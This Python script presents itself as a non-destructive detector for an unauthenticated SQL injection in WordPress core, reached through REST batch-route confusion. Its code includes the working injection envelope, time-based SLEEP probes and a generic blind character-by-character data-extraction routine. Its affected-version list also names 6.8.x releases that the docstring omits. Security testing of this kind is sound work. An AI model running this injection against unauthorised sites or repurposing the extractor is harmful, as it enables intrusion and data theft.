#!/usr/bin/env python3
"""
wp2shell_check.py — non-destructive detector for wp2shell
=========================================================
CVE-2026-63030 (REST /batch/v1 route confusion) + CVE-2026-60137
(WP_Query::author__not_in SQL injection) in WordPress core 6.9.0-6.9.4 / 7.0.0-7.0.1.

What it does
------------
Confirms the *unauthenticated SQL injection* with a time-based differential: it sends a
"fast" and a "slow" request through the batch-route confusion and measures the delay. It
reads no data and changes nothing (default mode). `--proof` additionally reads two harmless
scalars (@@version, current_user()) as hard evidence for a report — still read-only.

It does NOT attempt code execution. The INTO OUTFILE -> webshell path needs the DB user to
hold FILE privilege plus a web-served secure_file_priv dir (see README); that is out of scope
for a detector.

Authorized use only
-------------------
Run this against systems you own or are explicitly authorized to test. Remote (non-loopback)
targets require --authorized.

Usage
-----
    python3 wp2shell_check.py http://target[:port]           # single target, detection
    python3 wp2shell_check.py http://target --proof          # + read @@version as evidence
    python3 wp2shell_check.py -f hosts.txt --authorized --json
    python3 wp2shell_check.py http://127.0.0.1:8093          # local lab (no --authorized needed)

Exit codes: 0 = vulnerable, 1 = not vulnerable, 2 = inconclusive/error.
"""
import argparse
import json
import statistics
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

__version__ = "1.0.0"


class Target:
    def __init__(self, base, timeout=15, proxy=None, sleep=4.0, route="auto"):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.sleep = float(sleep)
        self.route = route
        self.batch = None  # resolved endpoint URL
        opener_handlers = []
        if proxy:
            opener_handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            opener_handlers.append(urllib.request.ProxyHandler({}))  # ignore env proxies
        self.opener = urllib.request.build_opener(*opener_handlers)

    # -- HTTP ---------------------------------------------------------------
    def _raw(self, url, data=None, headers=None, method=None):
        req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
        t0 = time.perf_counter()
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                body = r.read()
                return r.status, time.perf_counter() - t0, body
        except urllib.error.HTTPError as e:
            return e.code, time.perf_counter() - t0, e.read()

    def _endpoints(self):
        if self.route == "wp-json":
            return [self.base + "/wp-json/batch/v1"]
        if self.route == "rest-route":
            return [self.base + "/?rest_route=/batch/v1"]
        # auto: rest_route works without pretty permalinks; wp-json needs them
        return [self.base + "/?rest_route=/batch/v1", self.base + "/wp-json/batch/v1"]

    # -- payload ------------------------------------------------------------
    @staticmethod
    def _envelope(author_exclude_expr):
        """Nested batch that lands `author_exclude_expr` in WP_Query::author__not_in."""
        enc = urllib.parse.quote(author_exclude_expr, safe="")
        inner = {"requests": [
            {"method": "GET", "path": "http://:"},                       # misalignment trigger
            {"method": "GET", "path": "/wp/v2/categories?author_exclude=" + enc},
            {"method": "GET", "path": "/wp/v2/posts"},                   # supplies get_items handler
        ]}
        return {"requests": [
            {"method": "POST", "path": "http://:"},
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},   # self-call onto batch handler
            {"method": "POST", "path": "/batch/v1"},
        ]}

    def probe(self, expr):
        """Send one injection carrying <expr> as author_exclude. Returns (status, elapsed)."""
        body = json.dumps(self._envelope(expr)).encode()
        headers = {"Content-Type": "application/json", "User-Agent": "wp2shell_check/%s" % __version__}
        if self.batch is None:
            # resolve which endpoint form the site accepts (a processed batch answers 207/200)
            for ep in self._endpoints():
                st, _, _ = self._raw(ep, data=body, headers=headers, method="POST")
                if st in (200, 207):
                    self.batch = ep
                    break
            if self.batch is None:
                self.batch = self._endpoints()[0]  # fall back; timing still decides
        st, el, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
        return st, el

    # -- detection ----------------------------------------------------------
    def detect(self, rounds=3):
        fast = statistics.median(self.probe("SELECT 0")[1] for _ in range(rounds))
        slow = statistics.median(self.probe("SELECT SLEEP(%g)" % self.sleep)[1] for _ in range(rounds))
        delta = slow - fast
        # vulnerable if the slow path tracks our injected sleep and the fast path did not
        vulnerable = delta >= (self.sleep * 0.6) and fast < (self.sleep * 0.5)
        return {"fast": fast, "slow": slow, "delta": delta, "vulnerable": vulnerable}

    # -- bounded read-only proof -------------------------------------------
    def _oracle(self, cond, unit=0.5):
        _, el = self.probe("SELECT IF((%s),SLEEP(%g),0)" % (cond, unit))
        return el > (unit * 0.6)

    def read_scalar(self, expr, maxlen=40, unit=0.5):
        v = "COALESCE((%s),'')" % expr
        lo, hi = 0, maxlen
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("CHAR_LENGTH(%s)>=%d" % (v, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        out = ""
        for pos in range(1, lo + 1):
            a, b = 32, 126
            while a < b:
                mid = (a + b + 1) // 2
                if self._oracle("ASCII(SUBSTRING(%s,%d,1))>=%d" % (v, pos, mid), unit):
                    a = mid
                else:
                    b = mid - 1
            out += chr(a)
        return out


# -- version fingerprint (best-effort, read-only) --------------------------
import re

AFFECTED = [((6, 9, 0), (6, 9, 4)), ((7, 0, 0), (7, 0, 1)), ((6, 8, 0), (6, 8, 5))]


def _ver_tuple(s):
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", s)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)) if m else None


def fingerprint_version(t):
    for path, pat in (("/", r'content="WordPress\s+([0-9.]+)"'),
                      ("/readme.html", r"Version\s+([0-9.]+)"),
                      ("/feed/", r"<generator>\s*https?://wordpress\.org/\?v=([0-9.]+)")):
        try:
            _, _, body = t._raw(t.base + path)
            m = re.search(pat, body.decode("utf-8", "replace"))
            if m:
                return m.group(1)
        except Exception:
            pass
    return None


def version_verdict(ver):
    vt = _ver_tuple(ver) if ver else None
    if not vt:
        return "unknown"
    return "affected-range" if any(lo <= vt <= hi for lo, hi in AFFECTED) else "outside-affected-range"


# -- driver ----------------------------------------------------------------
def is_local(base):
    host = urllib.parse.urlparse(base).hostname or ""
    return host in ("localhost", "127.0.0.1", "::1", "[::1]")


def scan_one(url, args):
    t = Target(url, timeout=args.timeout, proxy=args.proxy, sleep=args.sleep, route=args.route)
    rec = {"target": url}
    try:
        det = t.detect(rounds=args.rounds)
    except urllib.error.URLError as e:
        rec.update(status="error", error=str(e.reason))
        return rec, 2
    ver = fingerprint_version(t)
    rec["wp_version"] = ver
    rec["version_verdict"] = version_verdict(ver)
    rec["fast_s"] = round(det["fast"], 3)
    rec["slow_s"] = round(det["slow"], 3)
    rec["delta_s"] = round(det["delta"], 3)
    rec["status"] = "vulnerable" if det["vulnerable"] else "not_vulnerable"
    code = 0 if det["vulnerable"] else 1
    if det["vulnerable"] and args.proof:
        try:
            rec["proof"] = {"@@version": t.read_scalar("SELECT @@version", 40),
                            "current_user()": t.read_scalar("SELECT CURRENT_USER()", 48)}
        except Exception as e:
            rec["proof_error"] = str(e)
    return rec, code


def human(rec):
    tag = {"vulnerable": "VULNERABLE", "not_vulnerable": "not vulnerable", "error": "ERROR"}[rec["status"]]
    line = "[%s] %s" % (tag, rec["target"])
    if rec.get("wp_version"):
        line += "  (WordPress %s, %s)" % (rec["wp_version"], rec["version_verdict"])
    if rec["status"] == "error":
        line += "  -- %s" % rec.get("error")
    elif "delta_s" in rec:
        line += "  [fast=%.2fs slow=%.2fs delta=%.2fs]" % (rec["fast_s"], rec["slow_s"], rec["delta_s"])
    out = [line]
    if rec.get("proof"):
        for k, v in rec["proof"].items():
            out.append("        proof  %-16s = %s" % (k, v))
    return "\n".join(out)


def main():
    p = argparse.ArgumentParser(description="Non-destructive wp2shell (CVE-2026-63030/60137) detector.")
    p.add_argument("url", nargs="?", help="target base URL, e.g. http://host:8093")
    p.add_argument("-f", "--file", help="file with one target URL per line (# comments ok)")
    p.add_argument("--proof", action="store_true", help="read @@version + current_user() as evidence (read-only)")
    p.add_argument("--route", choices=("auto", "rest-route", "wp-json"), default="auto")
    p.add_argument("--sleep", type=float, default=4.0, help="injected SLEEP seconds (default 4)")
    p.add_argument("--rounds", type=int, default=3, help="median over N probes (default 3)")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 (Burp)")
    p.add_argument("--authorized", action="store_true", help="assert authorization for remote targets")
    p.add_argument("--json", action="store_true", help="emit JSON")
    args = p.parse_args()

    targets = []
    if args.file:
        with open(args.file) as fh:
            targets = [ln.strip() for ln in fh if ln.strip() and not ln.strip().startswith("#")]
    if args.url:
        targets.insert(0, args.url)
    if not targets:
        p.error("provide a target URL or -f hosts.txt")

    remote = [u for u in targets if not is_local(u)]
    if remote and not args.authorized:
        sys.stderr.write(
            "refusing remote targets without --authorized.\n"
            "Only test assets you own or are explicitly authorized to test.\n"
            "Affected remote targets: %s\n" % ", ".join(remote))
        return 2

    results, worst = [], 1
    for u in targets:
        if "://" not in u:
            u = "http://" + u
        rec, code = scan_one(u, args)
        results.append(rec)
        if not args.json:
            print(human(rec))
        worst = 0 if (worst == 0 or code == 0) else code
    if args.json:
        print(json.dumps(results, indent=2))
    # exit 0 if any vulnerable, else 1, else 2 on pure error
    if any(r["status"] == "vulnerable" for r in results):
        return 0
    if all(r["status"] == "error" for r in results):
        return 2
    return 1


if __name__ == "__main__":
    sys.exit(main())
